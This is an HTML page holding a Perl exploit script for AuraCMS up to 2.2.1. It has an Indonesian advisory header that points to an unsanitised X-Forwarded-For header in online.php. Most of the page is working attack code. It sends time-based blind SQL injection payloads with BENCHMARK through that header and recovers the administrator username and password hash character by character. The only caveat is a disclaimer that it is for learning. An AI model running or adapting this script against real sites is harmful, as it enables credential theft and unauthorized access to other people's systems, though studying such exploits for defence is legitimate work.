<html><head><title>AuraCMS <= 2.2.1 (online.php) Remote Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl -w
#
# Indonesian Newhack Security Advisory
# ------------------------------------
# AuraCMS 2.x (online.php) - Remote Blind SQL Injection Exploit
# Waktu			:  Feb 15 2008 01:00PM
# Software		:  AuraCMS   
# Versi			:  2.0
#			   2.1
#			   2.2.1
# Vendor 		:  http://www.auracms.org/
#
# ------------------------------------
# Audit Oleh 		:  NTOS-Team
# Lokasi		:  Indonesia | http://newhack.org
# Penjelasan		:
# 
# Kutu pada berkas &quot;online.php&quot;
# ---//---
# 05. $uipanda=getenv(&quot;HTTP_X_FORWARDED_FOR&quot;); // &lt;- Injeksi!
# 06. $uproxyserver=getenv(&quot;HTTP_VIA&quot;);
# 07. $uipproxy=getenv(&quot;REMOTE_ADDR&quot;);
# 08. $uhost=gethostbyaddr($uipproxy);
# 09. $utime=time();
# 10. $now=$utime-600; // (in seconds)
# --//--
# 12. @mysql_query(&quot;delete from useronline where timevisit&lt;$now&quot;);
# 13. $uexists=@mysql_num_rows(@mysql_query(&quot;select id from useronline where ipproxy='$uipproxy'&quot;));
# 14. if ($uexists&gt;0){
# 15. @mysql_query(&quot;update useronline set timevisit='$utime' where ipproxy='$uipproxy'&quot;);
# 16. } else {
# 17. @mysql_query(&quot;insert into useronline (ipproxy,host,ipanda,proxyserver,timevisit) values('$uipproxy','$uhost','$uipanda','$uproxyserver','$utime')&quot;); // &lt;- Injeksi!
# 18. }
# ---//---
# Injeksi dilakukan melalui manipulasi header X-Forwarded-For yang ditumpangi perintah SQL
# referensi mengenai injeksi SQL &quot;INSERT&quot; -&gt; http://www.milw0rm.com/papers/149
#
# =&gt; Perhatian!
# &quot;Exploit ini dibuat untuk pembelajaran, pengetesan dan pembuktian dari apa yang kami pelajari&quot;
# Segela penyalahgunaan dan kerusakan yang diakibat dari exploit ini bukan tanggung jawab kami
# 
# =&gt;Newhack Technology, OpenSource &amp; Security
# ~ NTOS-Team-&gt;[fl3xu5,opt1lc] ~   
use IO::Socket;
use strict;

if(!$ARGV[1]){ 
print &quot;\n  |-------------------------------------------------------|&quot;;
print &quot;\n  |            Indonesian Newhack Technology              |&quot;; 
print &quot;\n  |-------------------------------------------------------|&quot;;
print &quot;\n  |  AuraCMS 2.x (online.php) Remote Blind SQL Injection  |&quot;;
print &quot;\n  |                 Coded by NTOS-Team                    |&quot;;
print &quot;\n  |-------------------------------------------------------|&quot;;
print &quot;\n[!] &quot;; 
print &quot;\n[!] Exploit Berhasil jika magic_quotes_gpc = off pada server&quot;;
print &quot;\n[!] Penggunaan : perl aura2x-bsqli.pl [Site] [Path] [bencmark_delay]&quot;;
print &quot;\n[!] Contoh     : perl aura2x-bsqli.pl localhost /auracms2.x/ 2500000&quot;;
print &quot;\n[!] &quot;;
print &quot;\n&quot;;
exit;
}

my $delay	= &quot;2000000&quot;;
my $host       	= $ARGV[0];
my $dir         = $ARGV[1];
if ($ARGV[2]) { 
	$delay = $ARGV[2]; 
	}

print &quot;\nTarget url : &quot;.$host.$dir.&quot;\n\n&quot;;
$host =~ s/(http:\/\/)//;

my @array = (&quot;user&quot;,&quot;password&quot;);

print &quot;=&gt; Mencoba mencari satu per satu aksara yang tepat - Sabar ya.... ;)\n\n&quot;;

sleep(1);

&amp;blindsql();

sub blindsql() {
	my $x 		= &quot;&quot;;
	my $i		= &quot;&quot;;
	my $string	= &quot;&quot;;
	my $res		= &quot;1&quot;;
	for ( $x=0; $x&lt;=$#array; $x++ ) {
		my $j = 1;
		$res  = 1;
		while ($res) {
			for ($i=32;$i&lt;=127;$i++) {
				$res = 0;
				if ( $x eq 1 ) {
					next if ( $i &lt; 48 );
					next if ( ( $i &gt; 57 ) and ( $i &lt; 97 ) );
					next if ( $i &gt; 102 );
				}
				my $injeksi  = &quot;$i' AND IF(ASCII(SUBSTRING((SELECT &quot;.$array[$x].&quot; FROM useraura LIMIT 1),$j,1))=$i,BENCHMARK(&quot;.$delay.&quot;,MD5('X')),0) ,'$i','$i')/*&quot;;
							
				my $mulai = time();
				my $req = IO::Socket::INET-&gt;new( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$host&quot;, PeerPort =&gt; &quot;80&quot;) || die &quot;Error - Koneksi Gagal\n\n&quot;;
				print $req &quot;GET &quot;.$dir.&quot;index.php?pilih=stat&amp;mod=yes HTTP/1.1\r\n&quot;;
				print $req &quot;Host: $host\r\n&quot;;
				print $req &quot;X-Forwarded-For: &quot;.$injeksi.&quot;\r\n&quot;;
			 	print $req &quot;Keep-Alive: 300\r\n&quot;;
			    	print $req &quot;Connection: Keep-Alive\r\n&quot;;
        			print $req &quot;Cache-Control: no-cache\r\n&quot;;
        			print $req &quot;Connection: close\r\n\r\n&quot;;
				while (my $result = &lt;$req&gt;) {
					if ( $result =~ /404 Not Found/ ) {
					printf &quot;\n\nFile not found.\n\n&quot;;
					print &quot;\n\n$result\n\n&quot;;
					exit;
				}
				if ( $result =~ /400 Bad Request/ ) {
					printf &quot;\n\nBad request.\n\n&quot;;
					print &quot;\n\n$result\n\n&quot;;
					exit;
				}
			}
			my $akhir = time();
			my $waktuproses = $akhir - $mulai;
				if ( $waktuproses &gt; 4 ) {
				$string .= chr($i);
				print &quot;\n\tMendapatkan Aksara : &quot;.chr($i).&quot;\n\n&quot;;
				$res = 1;
				last;
			}
			print &quot;\tMencoba Aksara : &quot;.chr($i).&quot;\n&quot;;
		}
		$j++;
		if ( !$res ) {
			$array[$x] = $string;
			$string = &quot;&quot;;
		}
	}
}
print &quot;\n----------------------\n&quot;;
print &quot;Admin username : $array[0]\n&quot;;
print &quot;Admin password : $array[1]\n\n&quot;;
}

# milw0rm.com [2008-03-14]</pre></html>